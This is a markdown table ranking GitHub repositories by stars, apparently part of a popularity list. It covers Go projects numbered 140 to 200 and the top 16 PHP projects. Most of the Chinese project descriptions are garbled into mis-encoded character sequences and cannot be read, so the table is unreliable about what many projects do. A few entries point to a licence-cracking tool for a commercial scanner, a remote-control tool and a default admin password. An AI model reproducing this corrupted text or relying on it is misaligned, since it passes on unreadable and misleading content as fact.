|140|[didi/falcon-log-agent](https://github.com/didi/falcon-log-agent)|Áî®‰∫éÁõëÊéßÁ≥ªÁªüÁöÑÊó•ÂøóÈááÈõÜagentÔºåÂèØÊó†ÁºùÂØπÊé•open-falcon|452|Go|03/02|
|141|[wiatingpub/MTBSystem](https://github.com/wiatingpub/MTBSystem)|‰ΩøÁî®go-microÂæÆÊúçÂä°ÂÆûÁé∞ÁöÑÂú®Á∫øÁîµÂΩ±Èô¢ËÆ¢Á•®Á≥ªÁªü|439|Go|06/14|
|142|[EndlessCheng/mahjong-helper](https://github.com/EndlessCheng/mahjong-helper)|Êó•Êú¨È∫ªÂ∞ÜÂä©ÊâãÔºöÁâåÊïà+Èò≤ÂÆà+ËÆ∞ÁâåÔºàÊîØÊåÅÈõÄÈ≠Ç„ÄÅÂ§©Âá§Ôºâ|439|Go|07/23|
|143|[labulaka521/crocodile](https://github.com/labulaka521/crocodile)|Distributed Task Scheduling System ÂàÜÂ∏ÉÂºèÂÆöÊó∂‰ªªÂä°Ë∞ÉÂ∫¶Âπ≥Âè∞|439|Go|10/27|
|144|[hwholiday/learning_tools](https://github.com/hwholiday/learning_tools)|Go Â≠¶‰π†„ÄÅGo ËøõÈò∂„ÄÅGo ÂÆûÁî®Â∑•ÂÖ∑Á±ª„ÄÅGo-kit ÔºåGo-Micro ÂæÆÊúçÂä°ÂÆûË∑µ„ÄÅGo Êé®ÈÄÅ|438|Go|10/29|
|145|[zxh0/luago-book](https://github.com/zxh0/luago-book)|„ÄäËá™Â∑±Âä®ÊâãÂÆûÁé∞Lua„ÄãÈöè‰π¶Ê∫ê‰ª£Á†Å|431|Go|05/30|
|146|[Adminisme/ServerScan](https://github.com/Adminisme/ServerScan)|ServerScan‰∏ÄÊ¨æ‰ΩøÁî®GolangÂºÄÂèëÁöÑÈ´òÂπ∂ÂèëÁΩëÁªúÊâ´Êèè„ÄÅÊúçÂä°Êé¢ÊµãÂ∑•ÂÖ∑„ÄÇ|429|Go|04/07|
|147|[hzwy23/hauth](https://github.com/hzwy23/hauth)|hauthÈ°πÁõÆ,‰∏çÊòØ‰∏Ä‰∏™ÂâçÁ´ØorÂêéÂè∞Ê°ÜÊû∂ÔºÅ ËÄåÊòØ‰∏Ä‰∏™ÈõÜÊàêÊùÉÈôêÁÆ°ÁêÜÔºåËèúÂçïËµÑÊ∫êÁÆ°ÁêÜÔºåÂüüÁÆ°ÁêÜÔºåËßíËâ≤ÁÆ°ÁêÜÔºåÁî®Êà∑ÁÆ°ÁêÜÔºåÁªÑÁªáÊû∂ÊûÑÁÆ°ÁêÜÔºåÊìç‰ΩúÊó•ÂøóÁÆ°ÁêÜÁ≠âÁ≠âÁöÑÂø´ÈÄüÂºÄÂèëÂπ≥Âè∞Ôºé hauthÊòØ‰∏Ä‰∏™Âü∫Á°Ä‰∫ßÂìÅÔºåÂú®Ëøô‰∏™Âü∫Á°Ä‰∫ßÂìÅ‰∏äÔºåÊ†πÊçÆ‰∏öÂä°ÈúÄÊ±ÇÔºåÂø´ÈÄüÁöÑÂºÄÂèëÂ∫îÁî®ÊúçÂä°ÔºéË¥¶Âè∑ÔºöadminÔºåÂØÜÁ†ÅÔºö123456|425|Go|05/11|
|148|[Golangltd/LollipopGo](https://github.com/Golangltd/LollipopGo)|2.8.X ÁâàÊú¨Êõ¥Êñ∞ GolangËØ≠Ë®ÄÁ§æÂå∫  ÂÖ®ÁêÉÊúçÊ∏∏ÊàèÊúçÂä°Âô®Ê°ÜÊû∂,ÁõÆÂâçÂçèËÆÆÊîØÊåÅwebsocket„ÄÅhttpÂèäRPCÔºåÈááÁî®Áä∂ÊÄÅÂêåÊ≠•ÔºåÊÑøÊôØÔºöÊâìÈÄ†Á´ûÊäÄÂÆûÊó∂„ÄêÊØîËµõ„ÄëÂØπÊàòÊ∏∏ÊàèÂπ≥Âè∞Ê°ÜÊû∂ÔºÅ ÂäüËÉΩÊåÅÁª≠Êõ¥Êñ∞‰∏≠... ...|424|Go|10/29|
|149|[alibaba/RedisFullCheck](https://github.com/alibaba/RedisFullCheck)|redis-full-check is used to compare whether two redis have the same data. redis-full-checkÁî®‰∫éÊØîËæÉ2‰∏™redisÊï∞ÊçÆÊòØÂê¶‰∏ÄËá¥ÔºåÊîØÊåÅÂçïËäÇÁÇπ„ÄÅ‰∏ª‰ªé„ÄÅÈõÜÁæ§Áâà„ÄÅ‰ª•ÂèäÂ§öÁßçproxyÔºåÊîØÊåÅÂêåÊûÑ‰ª•ÂèäÂºÇÊûÑÂØπÊØîÔºåredisÁöÑÁâàÊú¨ÊîØÊåÅ2.x-5.x„ÄÇ|422|Go|06/15|
|150|[hr3lxphr6j/bililive-go](https://github.com/hr3lxphr6j/bililive-go)|‰∏Ä‰∏™Áõ¥Êí≠ÂΩïÂà∂Â∑•ÂÖ∑|421|Go|10/29|
|151|[childe/gohangout](https://github.com/childe/gohangout)|golangÁâàÊú¨ÁöÑhangout, Â∏åÊúõËÉΩÁúÅ‰∫õÂÜÖÂ≠ò. ‰ΩøÁî®‰∫ÜËá™Â∑±ÂÜôÁöÑKafka lib .. Ëôö. ‰∏çËøáÊàë‰ª¨Âú®Áîü‰∫ßÁéØÂ¢ÉÂ∑≤Áªè‰ΩøÁî®Ëøë1Âπ¥, kafka ÁâàÊú¨‰ªé0.9.0.1Âà∞2.0ÈÉΩÂú®‰ΩøÁî®, ÁõÆÂâçÊÉÖÂÜµÁ®≥ÂÆö. ÂêûÂêêÈáèÂú®ÊØèÂ§©2000‰∫øÊù°‰ª•‰∏ä.|407|Go|10/28|
|152|[zu1k/xray-crack](https://github.com/zu1k/xray-crack)|xrayÁ§æÂå∫È´òÁ∫ßÁâàËØÅ‰π¶ÁîüÊàêÔºå‰ªÖ‰æõÂ≠¶‰π†Á†îÁ©∂ÔºåÊ≠£Â∏∏‰ΩøÁî®ËØ∑ÊîØÊåÅÊ≠£Áâà|387|Go|10/20|
|153|[zu1k/nali](https://github.com/zu1k/nali)|An offline tool for querying IP geographic information and CDN provider.‰∏Ä‰∏™Êü•ËØ¢IPÂú∞ÁêÜ‰ø°ÊÅØÂíåCDNÊúçÂä°Êèê‰æõÂïÜÁöÑÁ¶ªÁ∫øÁªàÁ´ØÂ∑•ÂÖ∑.|382|Go|10/28|
|154|[withlin/canal-go](https://github.com/withlin/canal-go)| Alibaba mysql database binlog incremental subscription & consumer components Canal's golang client[ÈòøÈáåÂ∑¥Â∑¥mysqlÊï∞ÊçÆÂ∫ìbinlogÁöÑÂ¢ûÈáèËÆ¢ÈòÖ&Ê∂àË¥πÁªÑ‰ª∂ Canal ÁöÑ go ÂÆ¢Êà∑Á´Ø ]   https://github.com/alibaba/canal |380|Go|08/08|
|155|[wumansgy/GoAndBlockChainStudy](https://github.com/wumansgy/GoAndBlockChainStudy)|go and blockchain study noteÔºåÊ¨¢ËøéÂêÑ‰ΩçÂøóÂêåÈÅìÂêàÁöÑÊúãÂèã‰∏ÄËµ∑ÂÆåÂñÑÔºåËÆ©Êõ¥Â§öÁöÑgoÊàñËÄÖÂå∫ÂùóÈìæÂºÄÂèëËÄÖËÉΩÂ§üÊúâ‰∏Ä‰ªΩ‰∏çÈîôÁöÑÂ≠¶‰π†ËµÑÊñô|372|Go|06/10|
|156|[qit-team/snow](https://github.com/qit-team/snow)|ÁÆÄÊ¥ÅÊòìÁî®ÁöÑGo‰∏öÂä°Ê°ÜÊû∂|364|Go|08/31|
|157|[didi/sharingan](https://github.com/didi/sharingan)|SharinganÔºàÂÜôËΩÆÁúºÔºâÊòØ‰∏Ä‰∏™Âü∫‰∫égolangÁöÑÊµÅÈáèÂΩïÂà∂ÂõûÊîæÂ∑•ÂÖ∑ÔºåÈÄÇÂêàÈ°πÁõÆÈáçÊûÑ„ÄÅÂõûÂΩíÊµãËØïÁ≠â„ÄÇ|356|Go|09/11|
|158|[micro-in-cn/starter-kit](https://github.com/micro-in-cn/starter-kit)|Quick Go-Micro Âø´ÈÄüÂºÄÂèëÂåÖ|355|Go|09/26|
|159|[zboya/golang_runtime_reading](https://github.com/zboya/golang_runtime_reading)|golang 1.10.2 runtime code reading - golang runtimeÊ∫êÁ†ÅÂàÜÊûê„ÄÇÂè™ÊúâÊÄùËÄÉËøáÔºå‰Ω†Êâç‰ºöÂç∞Ë±°Ê∑±Âàª„ÄÇ|354|Go|06/07|
|160|[jemygraw/TechDoc](https://github.com/jemygraw/TechDoc)|Ëá™Â∑±ÁºñÂÜôÁöÑÊäÄÊúØÊñáÊ°£Ê±áÊÄª|349|Go|07/01|
|161|[zc2638/go-standard](https://github.com/zc2638/go-standard)|GoÂ∏∏Áî®ËßÑËåÉÂÆö‰πâÔºåÊ†áÂáÜÂ∫ìÊñπÊ≥ï‰ΩøÁî®Á§∫‰æãÔºåËØ∑Ê≥®ÊÑèËøô‰∏çÊòØGoÁöÑ‰∏≠ÊñáÁâàÊ†áÂáÜÂ∫ì(ÂÜÖÂê´‰º†ÈÄÅÈó®)|341|Go|05/28|
|162|[iissy/goweb](https://github.com/iissy/goweb)|‰∏Ä‰∏™Áî®GolangÂÜôÁöÑCMSÔºàÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªüÔºâ|338|Go|08/28|
|163|[go-workflow/go-workflow](https://github.com/go-workflow/go-workflow)|goÁâàÊú¨ÊûÅÁÆÄÂ∑•‰ΩúÊµÅÂºïÊìé|337|Go|04/12|
|164|[ego008/goyoubbs](https://github.com/ego008/goyoubbs)|golang ÂÆûÁé∞ÁöÑyouBBSÔºåËá™Âä®ÂÆâË£Ö„ÄÅÊõ¥Êñ∞HTTPS|336|Go|03/18|
|165|[saltbo/zpan](https://github.com/saltbo/zpan)|A self-host cloud disk base on the cloud storage./ ‰∏Ä‰∏™Âü∫‰∫é‰∫ëÂ≠òÂÇ®ÁöÑÁΩëÁõòÁ≥ªÁªüÔºåÁî®‰∫éËá™Âª∫ÁßÅ‰∫∫ÁΩëÁõòÊàñ‰ºÅ‰∏öÁΩëÁõò„ÄÇ|334|Go|10/28|
|166|[ma6254/FictionDown](https://github.com/ma6254/FictionDown)|Â∞èËØ¥‰∏ãËΩΩ Â∞èËØ¥Áà¨Âèñ Ëµ∑ÁÇπ Á¨îË∂£ÈòÅ ÂØºÂá∫Markdown ÂØºÂá∫txt ËΩ¨Êç¢epub ÂπøÂëäËøáÊª§ Ëá™Âä®Ê†°ÂØπ|332|Go|06/08|
|167|[q191201771/lal](https://github.com/q191201771/lal)|üî• Golang live stream lib/client/server. support RTMP, RTSP(sdp+rtp+rtcp), HTTP(S)-FLV, HTTP-TS, HLS(m3u8+ts), H264/AVC, H265/HEVC, AAC, relay pull & push, record, HTTP API, GOP cache.    GoÁõ¥Êí≠ÊµÅÂ™í‰ΩìÁΩëÁªú‰º†ËæìÊúçÂä°Âô®|330|Go|10/28|
|168|[sunshinev/go-sword](https://github.com/sunshinev/go-sword)|„ÄêGo-sword„ÄëÂèØËßÜÂåñCRUDÁÆ°ÁêÜÂêéÂè∞ÁîüÊàêÂ∑•ÂÖ∑|330|Go|09/11|
|169|[dengsgo/fileboy](https://github.com/dengsgo/fileboy)|fileboyÔºåÊñá‰ª∂ÂèòÊõ¥ÁõëÂê¨ÈÄöÁü•Â∑•ÂÖ∑Ôºå‰ΩøÁî® Go ÁºñÂÜô„ÄÇFileboy, File Change Monitoring Notification Tool, written with Go.|327|Go|10/17|
|170|[KenmyZhang/single-sign-on](https://github.com/KenmyZhang/single-sign-on)|Âü∫‰∫éGoËØ≠Ë®ÄÂÆûÁé∞ÁöÑÂçïÁÇπÁôªÂΩïÁ≥ªÁªüÔºàssoÔºâ ÊîØÊåÅÊâãÊú∫Âè∑Á†Å+È™åËØÅÁ†Å„ÄÅÈÇÆÁÆ±+È™åËØÅÁ†Å„ÄÅÂæÆ‰ø°Á¨¨‰∏âÊñπÊéàÊùÉ‰∏âÁßçÊñπÂºèÊ≥®ÂÜå ÊîØÊåÅÊâãÊú∫Âè∑Á†Å„ÄÅÁî®Êà∑Âêç„ÄÅÈÇÆÁÆ±Âè∑Á†Å„ÄÅÂæÆ‰ø°ÁôªÂΩï ÊîØÊåÅÊâãÊú∫ÂíåÈÇÆÁÆ±ÊâæÂõûÂØÜÁ†Å ÊîØÊåÅÈòøÈáå‰∫ëÈÄö‰ø°Âíå‰∫í‰∫øÊó†Á∫øÁöÑÁü≠‰ø°È™åËØÅÁ†ÅÊúçÂä°|326|Go|08/29|
|171|[gookit/validate](https://github.com/gookit/validate)|‚öî Go package for data validation and filtering. support Map, Struct, Form data. GoÈÄöÁî®ÁöÑÊï∞ÊçÆÈ™åËØÅ‰∏éËøáÊª§Â∫ìÔºå‰ΩøÁî®ÁÆÄÂçïÔºåÂÜÖÁΩÆÂ§ßÈÉ®ÂàÜÂ∏∏Áî®È™åËØÅ„ÄÅËøáÊª§Âô®ÔºåÊîØÊåÅËá™ÂÆö‰πâÈ™åËØÅÂô®„ÄÅËá™ÂÆö‰πâÊ∂àÊÅØ„ÄÅÂ≠óÊÆµÁøªËØë„ÄÇ|325|Go|10/26|
|172|[tomoya92/pybbs-go](https://github.com/tomoya92/pybbs-go)|beegoÂÜôÁöÑÁÆÄÂçïbbs|324|Go|05/06|
|173|[IrineSistiana/mos-chinadns](https://github.com/IrineSistiana/mos-chinadns)|‰∏Ä‰∏™DNSÂ∞èËΩØ‰ª∂„ÄÇÂ§öÂπ≥Âè∞Ëß£ÂéãÂç≥Áî®„ÄÇÊîØÊåÅDoH/T „ÄÇÂèØ‰ª•Ëá™ÂÆö‰πâIPÂíåÂüüÂêçÂàÜÊµÅËßÑÂàô„ÄÇÊîØÊåÅv2rayËßÑÂàôÊñá‰ª∂„ÄÇ|319|Go|10/26|
|174|[wx-chevalier/Database-Series](https://github.com/wx-chevalier/Database-Series)|üìöÊ∑±ÂÖ•ÊµÖÂá∫Êï∞ÊçÆÂ∫ìÂ≠òÂÇ®ÔºöÊï∞ÊçÆÂ∫ìÁêÜËÆ∫„ÄÅÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ì„ÄÅÊñáÊ°£ÂûãÊï∞ÊçÆÂ∫ì„ÄÅÈîÆÂÄºÂûãÊï∞ÊçÆÂ∫ì„ÄÅNew SQL„ÄÅÊêúÁ¥¢ÂºïÊìé„ÄÅÊï∞ÊçÆ‰ªìÂ∫ì‰∏é OLAP„ÄÅÂ§ßÊï∞ÊçÆ‰∏éÊï∞ÊçÆ‰∏≠Âè∞|318|Go|10/29|
|175|[magiclvzs/antnet](https://github.com/magiclvzs/antnet)|A game server net framework in Golang go(Golang)Ê∏∏ÊàèÊúçÂä°Âô®ÁΩëÁªúÊ°ÜÊû∂|315|Go|08/20|
|176|[admpub/nging](https://github.com/admpub/nging)|ÊºÇ‰∫ÆÁöÑGoËØ≠Ë®ÄÈÄöÁî®ÂêéÂè∞ÁÆ°ÁêÜÊ°ÜÊû∂ÔºåÂåÖÂê´ËÆ°Âàí‰ªªÂä°„ÄÅMySQLÁÆ°ÁêÜ„ÄÅRedisÁÆ°ÁêÜ„ÄÅFTPÁÆ°ÁêÜ„ÄÅSSHÁÆ°ÁêÜ„ÄÅÊúçÂä°Âô®ÁÆ°ÁêÜ„ÄÅCaddyÈÖçÁΩÆ„ÄÅ‰∫ëÂ≠òÂÇ®ÁÆ°ÁêÜÁ≠âÂäüËÉΩ„ÄÇ|315|Go|10/29|
|177|[jaywcjlove/golang-tutorial](https://github.com/jaywcjlove/golang-tutorial)|GoËØ≠Ë®ÄÂø´ÈÄüÂÖ•Èó®|312|Go|03/25|
|178|[micro-plat/hydra](https://github.com/micro-plat/hydra)|ÂêéÁ´ØÂÖ®Ê†àÂºèÊúçÂä°Ê°ÜÊû∂ÔºåÊèê‰æõÊé•Âè£ÊúçÂä°Âô®„ÄÅwebÊúçÂä°Âô®„ÄÅwebsocketÊúçÂä°Âô®ÔºåRPCÊúçÂä°Âô®„ÄÅÁªü‰∏ÄË∞ÉÂ∫¶ÊúçÂä°Âô®„ÄÅÊ∂àÊÅØÊ∂àË¥πÊúçÂä°Âô®|307|Go|10/29|
|179|[zxysilent/blog](https://github.com/zxysilent/blog)|‰∏Ä‰∏™go„ÄÅecho„ÄÅvue ÂºÄÂèëÁöÑÂø´ÈÄü„ÄÅÁÆÄÊ¥Å„ÄÅÁæéËßÇ„ÄÅÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑ‰∏™‰∫∫ÂçöÂÆ¢Á≥ªÁªü(blog)„ÄÅ‰πüÂèØÊñπ‰æø‰∫åÊ¨°ÂºÄÂèë‰∏∫CMS(ÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªü)ÂíåÂêÑÁßç‰ºÅ‰∏öÈó®Êà∑ÁΩëÁ´ô|303|Go|09/24|
|180|[Tencent/bk-bcs](https://github.com/Tencent/bk-bcs)|ËìùÈ≤∏Êô∫‰∫ëÂÆπÂô®ÁÆ°ÁêÜÂπ≥Âè∞(BlueKing Container Service)|303|Go|10/29|
|181|[qieguo2016/algorithm](https://github.com/qieguo2016/algorithm)|Â∏∏Áî®ÁÆóÊ≥ïÂíåÊï∞ÊçÆÁªìÊûÑËÆ≤Ëß£ÔºåÈù¢ËØïÁÆóÊ≥ïÈ¢ò/leetcodeËß£È¢òÔºåÊèê‰æõgolang/jsÁâàÊú¨|296|Go|10/27|
|182|[chai2010/gopherchina2018-cgo-talk](https://github.com/chai2010/gopherchina2018-cgo-talk)|:book: GopherChina2018: Ê∑±ÂÖ•CGOÁºñÁ®ã - ÊúÄÊñ∞‰øÆËÆ¢|294|Go|08/15|
|183|[Shitaibin/golang_step_by_step](https://github.com/Shitaibin/golang_step_by_step)|GolangÂÖ•Èó®ÊïôÁ®ãÁöÑÊñáÁ´†„ÄÅÁ§∫‰æã‰ª£Á†ÅÔºåÂñúÊ¨¢Â∞±starÔºåËÆ¢ÈòÖÂ∞±watch|293|Go|08/24|
|184|[sohaha/zlsgo](https://github.com/sohaha/zlsgo)|‰∏Ä‰∏™ÁÆÄÂçïÊòìÁî®„ÄÅË∂≥Â§üËΩªÈáè„ÄÅÊÄßËÉΩÂ•ΩÁöÑ Golang Â∫ì|290|Go|10/27|
|185|[LXY1226/MiraiOK](https://github.com/LXY1226/MiraiOK)|Âè¶‰∏Ä‰∏™Mirai‰∏ÄÈîÆÂåÖ|287|Go|09/22|
|186|[hequan2017/go-admin](https://github.com/hequan2017/go-admin)|go web apiÔºåÂåÖÂê´gin+gorm+jwt+rbacÁ≠â„ÄÇ|284|Go|02/04|
|187|[esap/wechat](https://github.com/esap/wechat)|ÂæÆ‰ø°SDKÁöÑgolangÂÆûÁé∞ÔºåÁü≠Â∞èÁ≤æÊÇçÔºåÂêåÊó∂ÂÖºÂÆπ„Äê‰ºÅ‰∏öÂè∑/ÊúçÂä°Âè∑/ËÆ¢ÈòÖÂè∑/Â∞èÁ®ãÂ∫è„Äë|283|Go|09/13|
|188|[woodylan/go-websocket](https://github.com/woodylan/go-websocket)|Âü∫‰∫éGolangÂÆûÁé∞ÁöÑÂàÜÂ∏ÉÂºèWebSocketÊúçÂä°„ÄÅIMÊúçÂä°Ôºå‰ªÖ‰æùËµñEtcdÔºåÁÆÄÂçïÊòìÈÉ®ÁΩ≤ÔºåÊîØÊåÅÈ´òÂπ∂Âèë„ÄÅÂçïÂèë„ÄÅÁæ§Âèë„ÄÅÂπøÊí≠ÔºåÂÖ∂ÂÆÉÈ°πÁõÆÂèØ‰ª•ÈÄöËøáhttp‰∏éÊú¨È°πÁõÆÈÄö‰ø°„ÄÇ|279|Go|09/25|
|189|[Mikubill/transfer](https://github.com/Mikubill/transfer)|üç≠ ÈõÜÂêàÂ§ö‰∏™APIÁöÑÂ§ßÊñá‰ª∂‰º†ËæìÂ∑•ÂÖ∑.|276|Go|10/26|
|190|[makazeu/AnotherSteamCommunityFix](https://github.com/makazeu/AnotherSteamCommunityFix)|ÈÄöËøá‰øÆÊîπhostsËΩ¨ÂèëHTTPËØ∑Ê±ÇÁöÑÊñπÂºè‰∏¥Êó∂ÊÄß‰øÆÂ§çSteamCommunityÂú®‰∏≠ÂõΩÂ§ßÈôÜÊó†Ê≥ïËÆøÈóÆÁöÑÂ∞èÂ∑•ÂÖ∑|274|Go|04/29|
|191|[whitehatnote/BlueShell](https://github.com/whitehatnote/BlueShell)|Á∫¢ËìùÂØπÊäóË∑®Âπ≥Âè∞ËøúÊéßÂ∑•ÂÖ∑|273|Go|06/17|
|192|[idoubi/gonews](https://github.com/idoubi/gonews)|golangÊØèÊó•Êñ∞ÈóªÊ£ÄÁ¥¢Âπ≥Âè∞|261|Go|09/11|
|193|[islenbo/autossh](https://github.com/islenbo/autossh)|No password ssh client for Mac/Linux, one key login remote server. ‰∏Ä‰∏™SSHËøúÁ®ãÂÆ¢Êà∑Á´ØÔºåÂèØ‰∏ÄÈîÆÁôªÂΩïËøúÁ®ãÊúçÂä°Âô®Ôºå‰∏ªË¶ÅÁî®Êù•Âº•Ë°•Mac/Linux Terminal SSHÊó†Ê≥ï‰øùÂ≠òÂØÜÁ†ÅÁöÑ‰∏çË∂≥„ÄÇ|259|Go|07/23|
|194|[importcjj/sensitive](https://github.com/importcjj/sensitive)|ÊïèÊÑüËØçÊü•Êâæ,È™åËØÅ,ËøáÊª§ÂíåÊõøÊç¢ ü§ì FindAll, Validate, Filter and Replace words.|256|Go|04/16|
|195|[Mrs4s/MiraiGo](https://github.com/Mrs4s/MiraiGo)|qq-androidÂçèËÆÆÁöÑgolangÂÆûÁé∞, ÁßªÊ§ç‰∫émirai|250|Go|10/29|
|196|[asyncins/mist](https://github.com/asyncins/mist)|Ë∂ÖÈ´òÊÄßËÉΩ‰∏î‰∏çÂèóÊó∂Èó¥ÂõûÊã®ÂΩ±ÂìçÁöÑÂÖ®Â±ÄÂîØ‰∏Ä ID ÁîüÊàêÁÆóÊ≥ïÔºåËñÑÈõæÁÆóÊ≥ï|248|Go|06/06|
|197|[sodaling/FastestBilibiliDownloader](https://github.com/sodaling/FastestBilibiliDownloader)|BÁ´ôËßÜÈ¢ëÊûÅÈÄüÊâπÈáè‰∏ãËΩΩÂô® The fastest Bilibili video downloader|246|Go|10/16|
|198|[88250/city-geo](https://github.com/88250/city-geo)|üåÑ ‰∏≠ÂõΩÂüéÂ∏ÇÁªèÁ∫¨Â∫¶Êï∞ÊçÆ„ÄÇ|244|Go|09/11|
|199|[wumansgy/goEncrypt](https://github.com/wumansgy/goEncrypt)|goËØ≠Ë®ÄÂ∞ÅË£ÖÁöÑÂêÑÁßçÂØπÁß∞Âä†ÂØÜÂíåÈùûÂØπÁß∞Âä†ÂØÜÔºåÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®ÔºåÂåÖÊã¨3ÈáçDESÔºåAESÁöÑCBCÂíåCTRÊ®°ÂºèÔºåËøòÊúâRSAÈùûÂØπÁß∞Âä†ÂØÜ,ECCÊ§≠ÂúÜÊõ≤Á∫øÁöÑÂä†ÂØÜÂíåÊï∞Â≠óÁ≠æÂêç|242|Go|09/28|
|200|[goflyfox/gmanager](https://github.com/goflyfox/gmanager)|Âü∫‰∫égfÊ°ÜÊû∂ÁöÑÁÆ°ÁêÜÂπ≥Âè∞ÔºåÊîØÊåÅÁôªÂΩï„ÄÅËÆ§ËØÅ„ÄÅÁªÑÁªáÊú∫ÊûÑ„ÄÅÁî®Êà∑„ÄÅËßíËâ≤„ÄÅËèúÂçï„ÄÅÊó•Âøó|239|Go|07/11|

‚¨Ü [ÂõûÂà∞ÁõÆÂΩï](#ÁõÆÂΩï)

<br/>

## PHP

|#|Repository|Description|Stars|Language|Updated|
|:-|:-|:-|:-|:-|:-|
|1|[easychen/howto-make-more-money](https://github.com/easychen/howto-make-more-money)|Á®ãÂ∫èÂëòÂ¶Ç‰Ωï‰ºòÈõÖÁöÑÊå£Èõ∂Ëä±Èí±Ôºå2.0ÁâàÔºåÂçáÁ∫ß‰∏∫Â∞è‰π¶‰∫Ü„ÄÇMost of this not work outside China , so no English translate|12.9k|PHP|10/17|
|2|[top-think/think](https://github.com/top-think/think)|ThinkPHP Framework ‚Äî‚ÄîÂçÅÂπ¥Âå†ÂøÉÁöÑÈ´òÊÄßËÉΩPHPÊ°ÜÊû∂|7.6k|PHP|10/27|
|3|[guyueyingmu/avbook](https://github.com/guyueyingmu/avbook)|AV ÁîµÂΩ±ÁÆ°ÁêÜÁ≥ªÁªüÔºå avmoo , javbus , javlibrary Áà¨Ëô´ÔºåÁ∫ø‰∏ä AV ÂΩ±ÁâáÂõæ‰π¶È¶ÜÔºåAV Á£ÅÂäõÈìæÊé•Êï∞ÊçÆÂ∫ìÔºåJapanese Adult Video Library,Adult Video Magnet Links - Japanese Adult Video Database|7.3k|PHP|10/01|
|4|[helloqingfeng/Awsome-Front-End-learning-resource](https://github.com/helloqingfeng/Awsome-Front-End-learning-resource)|:octocat:GitHubÊúÄÂÖ®ÁöÑÂâçÁ´ØËµÑÊ∫êÊ±áÊÄª‰ªìÂ∫ìÔºàÂåÖÊã¨ÂâçÁ´ØÂ≠¶‰π†„ÄÅÂºÄÂèëËµÑÊ∫ê„ÄÅÊ±ÇËÅåÈù¢ËØïÁ≠âÔºâ|7.0k|PHP|08/28|
|5|[fecshop/yii2_fecshop](https://github.com/fecshop/yii2_fecshop)|yii2 ( PHP ) fecmallÔºàfecshopÔºâ core code used for ecommerce shop Â§öËØ≠Ë®ÄÂ§öË¥ßÂ∏ÅÂ§öÂÖ•Âè£ÁöÑÂºÄÊ∫êÁîµÂïÜ B2C ÂïÜÂüéÔºåÊîØÊåÅÁßªÂä®Á´Øvue, app, html5ÔºåÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂæÆÂ∫óÔºåÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂïÜÂüéÁ≠â|4.4k|PHP|10/12|
|6|[yansongda/pay](https://github.com/yansongda/pay)|ÂèØËÉΩÊòØÊàëÁî®ËøáÁöÑÊúÄ‰ºòÈõÖÁöÑ Alipay Âíå WeChat ÁöÑÊîØ‰ªò SDK Êâ©Â±ïÂåÖ‰∫Ü|3.6k|PHP|10/26|
|7|[overtrue/pinyin](https://github.com/overtrue/pinyin)|:cn: Âü∫‰∫éËØçÂ∫ìÁöÑ‰∏≠ÊñáËΩ¨ÊãºÈü≥‰ºòË¥®Ëß£ÂÜ≥ÊñπÊ°à|3.5k|PHP|10/03|
|8|[owner888/phpspider](https://github.com/owner888/phpspider)|„ÄäÊàëÁî®Áà¨Ëô´‰∏ÄÂ§©Êó∂Èó¥‚ÄúÂÅ∑‰∫Ü‚ÄùÁü•‰πé‰∏ÄÁôæ‰∏áÁî®Êà∑ÔºåÂè™‰∏∫ËØÅÊòéPHPÊòØ‰∏ñÁïå‰∏äÊúÄÂ•ΩÁöÑËØ≠Ë®Ä „ÄãÊâÄ‰ΩøÁî®ÁöÑÁ®ãÂ∫è|3.2k|PHP|10/10|
|9|[overtrue/laravel-wechat](https://github.com/overtrue/laravel-wechat)|ÂæÆ‰ø° SDK for Laravel, Âü∫‰∫é overtrue/wechat|2.5k|PHP|10/09|
|10|[overtrue/easy-sms](https://github.com/overtrue/easy-sms)|:calling: ‰∏ÄÊ¨æÊª°Ë∂≥‰Ω†ÁöÑÂ§öÁßçÂèëÈÄÅÈúÄÊ±ÇÁöÑÁü≠‰ø°ÂèëÈÄÅÁªÑ‰ª∂|2.2k|PHP|10/04|
|11|[summerblue/laravel-shop](https://github.com/summerblue/laravel-shop)|Laravel ÁîµÂïÜÂÆûÊàòÊïôÁ®ãÁöÑÈ°πÁõÆ‰ª£Á†Å|2.2k|PHP|09/08|
|12|[matyhtf/framework](https://github.com/matyhtf/framework)|SPF ÔºàSwoole PHP FrameworkÔºâÔºå‰∏ñÁïåÁ¨¨‰∏ÄÊ¨æÂü∫‰∫éSwooleÊâ©Â±ïÁöÑPHPÊ°ÜÊû∂ÔºåÂºÄÂèëËÄÖÊòØSwooleÂàõÂßã‰∫∫ |2.2k|PHP|06/30|
|13|[helei112g/payment](https://github.com/helei112g/payment)|PaymentÊòØphpÁâàÊú¨ÁöÑÊîØ‰ªòËÅöÂêàÁ¨¨‰∏âÊñπsdkÔºåÈõÜÊàê‰∫ÜÂæÆ‰ø°ÊîØ‰ªò„ÄÅÊîØ‰ªòÂÆùÊîØ‰ªò„ÄÅÊãõÂïÜ‰∏ÄÁΩëÈÄöÊîØ‰ªò„ÄÇÊèê‰æõÁªü‰∏ÄÁöÑË∞ÉÁî®Êé•Âè£ÔºåÊñπ‰æøÂø´ÈÄüÊé•ÂÖ•ÂêÑÁßçÊîØ‰ªò„ÄÅÊü•ËØ¢„ÄÅÈÄÄÊ¨æ„ÄÅËΩ¨Ë¥¶ËÉΩÂäõ„ÄÇÊúçÂä°Á´ØÊé•ÂÖ•ÊîØ‰ªòÂäüËÉΩÔºåÊñπ‰æø„ÄÅÂø´Êç∑„ÄÇ|2.2k|PHP|10/20|
|14|[jae-jae/QueryList](https://github.com/jae-jae/QueryList)|:spider: The progressive PHP crawler framework!  ‰ºòÈõÖÁöÑÊ∏êËøõÂºèPHPÈááÈõÜÊ°ÜÊû∂„ÄÇ|2.2k|PHP|09/27|
|15|[Qsnh/meedu](https://github.com/Qsnh/meedu)|ÂºÄÊ∫êÂú®Á∫øÊïôËÇ≤ÁÇπÊí≠Á≥ªÁªü„ÄÇ|2.0k|PHP|10/29|
|16|[summerblue/phphub5](https://github.com/summerblue/phphub5)|PHPHub Ver 5 is a Forum project Powered by Laravel 5.1, and it is also the project build up PHP & Laravel China community ÔºàÊ≠§È°πÁõÆÂ∑≤ÂºÉÁî®Ôºâ|2.0k|PHP|03/09|
